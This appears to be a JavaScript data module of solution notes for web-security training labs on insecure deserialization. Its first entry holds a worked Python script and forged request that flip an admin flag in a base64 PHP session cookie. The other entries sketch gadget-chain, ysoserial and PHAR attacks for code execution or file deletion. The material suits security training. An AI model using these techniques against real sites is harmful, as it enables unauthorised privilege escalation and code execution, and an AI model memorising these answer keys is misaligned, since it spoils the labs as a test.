export default {
  'deserialization-lab-deserialization-modifying-serialized-objects': {
    note: 'The session cookie is base64 PHP serialization; change the admin boolean to `b:1` and re-encode it.',
    work: {
      hints: [
        'Decode the session cookie. It is base64; the decoded bytes look like `O:4:"User":...`.',
        'Find the `admin` property. A boolean is `b:0` (false) or `b:1` (true).',
        'Change `b:0` to `b:1`, base64-encode the result, replace the cookie, and open `/admin`.'
      ],
      approach:
        'The application trusts a client-side serialized object as its session state. There is no signature and no server-side session store, so editing a property changes the authorisation decision. This is tampering, not a gadget chain.',
      request: `GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=TzoxMjoiVXNlciI6Mjp7czo1OiJhZG1pbiI7YjoxO3M6ODoidXNlcm5hbWUiO3M6Njoid2llbmVyIjt9`,
      tokens: [
        ['Tzox...', 'Base64 of the serialized `User` object. The cookie is the entire session state.'],
        ['O:4:"User"', 'An object of class User; the class must exist on the server.'],
        [':2:', 'Number of properties that follow. Mismatch this and the parser errors.'],
        ['s:5:"admin"', 'Property name, length-prefixed. The length must match exactly.'],
        ['b:1', 'Boolean true. Changing this from `b:0` promotes the user.'],
        ['s:8:"username"', 'A second property; string lengths are part of the grammar.']
      ],
      script: `import sys, base64, re, requests

host, cookie = sys.argv[1], sys.argv[2]
raw = base64.b64decode(cookie).decode()
print("before:", raw)
forged = raw.replace('s:5:"admin";b:0', 's:5:"admin";b:1')
assert forged != raw, "admin property not found"
enc = base64.b64encode(forged.encode()).decode()
r = requests.get(f"https://{host}/admin", cookies={"session": enc}, timeout=20)
print(r.status_code, "admin" in r.text.lower())`
    }
  },
  'deserialization-lab-deserialization-modifying-serialized-data-types': {
    note: 'Change a string to an integer or use PHP type juggling so a comparison with `==` treats two different values as equal.'
  },
  'deserialization-lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization': {
    note: 'The object\'s destructor deletes a file path stored in a property; point it at Carlos\'s avatar or a critical file.'
  },
  'deserialization-lab-deserialization-arbitrary-object-injection-in-php': {
    note: 'A class with a dangerous `__destruct` is autoloaded; inject an object of that class with an attacker-controlled path.'
  },
  'deserialization-lab-deserialization-exploiting-java-deserialization-with-apache-commons': {
    note: 'The classpath includes Apache Commons Collections; use a known `ysoserial` chain to execute a command.'
  },
  'deserialization-lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain': {
    note: 'The framework ships a gadget chain; leak the secret key from the debug page, sign the payload, and trigger it.'
  },
  'deserialization-lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain': {
    note: 'Ruby `Marshal.load` plus a known chain (ERB/Gem) gives code execution; adapt the documented payload.'
  },
  'deserialization-lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization': {
    note: 'No public chain fits; build one from the application\'s own classes by following `readObject` to a sink.'
  },
  'deserialization-lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization': {
    note: 'Inspect the source for magic methods and construct a chain that reaches `system()` or a file write.'
  },
  'deserialization-lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain': {
    note: 'Upload a PHAR whose metadata contains the gadget; trigger it with a `phar://` file operation.'
  }
}
